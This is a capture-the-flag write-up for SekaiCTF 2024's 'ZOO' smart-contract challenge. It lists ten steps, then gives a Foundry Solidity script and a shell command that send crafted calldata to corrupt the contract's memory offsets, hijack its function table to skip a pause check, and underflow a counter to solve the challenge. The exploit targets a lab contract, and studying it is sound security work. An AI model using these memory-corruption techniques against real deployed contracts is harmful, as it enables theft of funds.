## ZOO

You can check detail in my [blog](https://blog.solidity.kr/posts/(ctf)-2024-SekaiCTF/)

1. add a `fake_animal` with the target index in the name, and set its index to 0x400 (the offset of the first animal).
2. delete first index to set the 7th offset to 0x400 (offset of first animal)
3. edit 7th type (first animal) to 0x80 (function table offset)
4. delete first index to set the 7th offset to 0x80 (offset of function table)
5. edit 7th type (offset of function_table) to 0x323 (over the pause check logic)
6. edit 6th type (0x400) to 0x300 (offset of local_animal)
7. delete first index to set the 7th offset to local_animal
8. edit 7th type (first offset of local_animal) to 0x460 (offset of fake_animal)
9. only one animal was added, but it was deleted three times, causing the `animal_count` to become a negative number. Now, add three animals to index 1.
10. add length padding to ensure the locate local_animal is located at 0x300

### Solve.s.sol & solve.sh
---

```solidity
pragma solidity ^0.8.25;

import {Script, console2} from "forge-std/Script.sol";

interface Setup {
    function zoo() external view returns (address);
    function isSolved() external view returns (bool);
}

contract Solve is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        console2.log("setup", address(setup));
        address zoo = setup.zoo();
        console2.log("zoo", address(zoo));

        // ADD(1) | IDX(1) | NAME_LENGTH(2) | TYPE(2) | NAME(NAME_LENGTH)
        // EDIT(1) | IDX(1) | EDIT_TYPE(1) | NAME_LENGTH(2) | NAME(NAME_LENGTH)
        // EDIT{1) | IDX(1) | EDIT_TYPE(1) | NEW_TYPE(2)
        // DEL(1) | IDX(1)

        // function pointer: 0x80 ( 0x312 )
        // local animal : 0x300
        // first animal: 0x320
        // first alloc : 0x420
        // fake_animal : 0x460
        // 0x323 : over pause

        uint256 target_idx = uint256(int256(-1)) - uint256(keccak256(abi.encode(2)));
        uint16 target_jmp = 0x323;
        uint16 function_table = 0x80;
        uint16 first_alloc = 0x400;
        uint16 local_animal = 0x300;
        uint16 fake_animal_idx = 0x460;
        target_idx /= 2;
        target_idx += 1;

        bytes memory call = "";
        bytes memory fake_animal = abi.encodePacked(uint256(target_idx), uint256(0x20), hex"41414141");
        call = abi.encodePacked(call, uint8(0x10),uint8(0x00),uint16(fake_animal.length),uint16(first_alloc), fake_animal);
        call = abi.encodePacked(call, hex"3000");
        call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(function_table));
        call = abi.encodePacked(call, hex"3000");
        call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(target_jmp));
        call = abi.encodePacked(call, uint8(0x20),uint8(0x06),uint8(0x22), uint16(local_animal));
        call = abi.encodePacked(call, hex"3000");
        call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(fake_animal_idx));
        call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex"41414141");
        call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex"41414141");
        call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex"41414141");

        uint256 length = call.length;
        console2.log("length", length);
        uint256 target = 0x200 - length;
        for (uint i = 0; i < target; i++) {
            call = abi.encodePacked(call, hex"ba");
        }
        (bool success, bytes memory out) = address(zoo).call(call);
        console2.log("solved?", setup.isSolved());
        assert(setup.isSolved());
        vm.stopBroadcast();
    }
}
```

```sh
export RPC=<rpc>
export PVKEY=<pvKey>
export SETUP=<setup-address>

forge init --force .
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Solve.s.sol:Solve --evm-version cancun
```

> flag: SEKAI{super-duper-memory-master-:3}

